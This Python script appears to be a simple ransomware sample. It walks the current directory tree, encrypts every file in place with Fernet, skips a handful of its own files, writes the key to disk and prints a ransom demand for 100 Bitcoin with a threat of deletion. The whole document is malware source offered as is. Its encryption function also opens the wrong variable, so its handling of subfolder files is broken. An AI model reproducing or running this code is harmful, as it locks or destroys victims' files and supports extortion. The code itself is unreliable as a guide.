
import os 
from cryptography.fernet import Fernet

# Function that encrypts one file
def encrypt_file(file_path, key):
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)

# Key generation (this will be used later in the decryption stage)
key = Fernet.generate_key()

with open("thekey.key","wb") as thekey:
	thekey.write(key)

# traversing all directories and subdirectories 
for root, dirs, files in os.walk('.'):
	for file in files:
		# This is temporary. This is just to ensure that the important files do not get encrypted. 
		if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py" or file == "dryrun.py" or file == "README.md":	#if file  is voldemort.py the dont add
			continue
		# getting the full path of the file
		file_path = os.path.join(root, file)

		# function call to encrypt file
		encrypt_file(file_path, key)

print(files)

print("All of your files have been encrypted!! Send me 100 Bitcoin or I will delete them in 24 hours... ")
